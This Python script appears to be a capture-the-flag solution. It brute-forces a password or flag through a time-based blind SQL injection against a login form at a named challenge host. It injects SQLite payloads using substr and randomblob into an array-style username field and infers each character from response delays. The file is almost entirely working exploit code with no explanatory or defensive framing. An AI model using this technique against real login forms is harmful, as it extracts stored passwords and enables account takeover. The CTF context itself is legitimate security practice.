import readline
import requests
import string

#flag_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}'
flag_str = '!_{}"#$%&()*+,-.:;<=>?@[]^|~ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'
flag = 'FLAG{'

def brute():
    global flag, flag_str
    while True:
        index = 0
        while index < len(flag_str):
            guess = flag + flag_str[index]
            data = {"username[]":"kirito' AND substr(password,1,{})='{}' AND 1=randomblob(100000000)--".format(len(guess), guess)}
            print(data)
            #res = requests.post(b'http://192.168.88.140:18000/login', data=data)
            res = requests.post(b'https://sao.h4ck3r.quest/login', data=data)
            t = res.elapsed.total_seconds()
            print(t)
            if t > 5.14 and t < 5.17:
                res = requests.post(b'https://sao.h4ck3r.quest/login', data=data)
                t = res.elapsed.total_seconds()
                if not (t > 5.14 and t < 5.17):
                    continue

                flag = guess
                print(flag)
                break
            elif t < 5.11:
                index += 1

def test(guess):
    data = {"username[]":"kirito' AND substr(password,{},1)='{}' AND 1=randomblob(999999999999)--".format(len(guess), guess[-1])}
    #data = {"username[]":"kirito' AND password LIKE '{}%' AND 1=randomblob(100000000)--".format('FLAG{C')}
    print(data)
    res = requests.post(b'https://sao.h4ck3r.quest/login', data=data)
    t = res.elapsed.total_seconds()
    print(t)

while True:
  guess = 'FLAG{' + input('> ')
  test(guess)
#brute()
